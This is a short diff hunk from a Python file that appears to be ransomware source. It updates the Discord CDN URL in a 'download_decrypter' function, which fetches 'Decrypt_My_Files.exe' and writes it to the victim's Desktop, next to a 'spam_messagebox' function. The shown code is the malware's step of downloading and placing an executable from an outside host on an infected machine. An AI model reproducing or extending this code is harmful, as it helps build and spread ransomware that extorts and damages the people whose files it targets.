@@ -136,7 +136,7 @@ def spam_messagebox():
 def download_decrypter():
 
     NAME = os.getlogin()
-    req = urllib.request.Request('https://cdn.discordapp.com/attachments/947224575622676520/966006697120378880/Decrypt_My_Files.exe', headers={'User-Agent': 'Mozilla/5.0'})
+    req = urllib.request.Request('https://cdn.discordapp.com/attachments/947224575622676520/968921038786285668/Decrypt_My_Files.exe', headers={'User-Agent': 'Mozilla/5.0'})
     f = urlopen(req)
     filecontent = f.read()
     with open(f'C:\\Users\\{NAME}\\Desktop\\Decrypt_My_Files.exe', 'wb') as f:
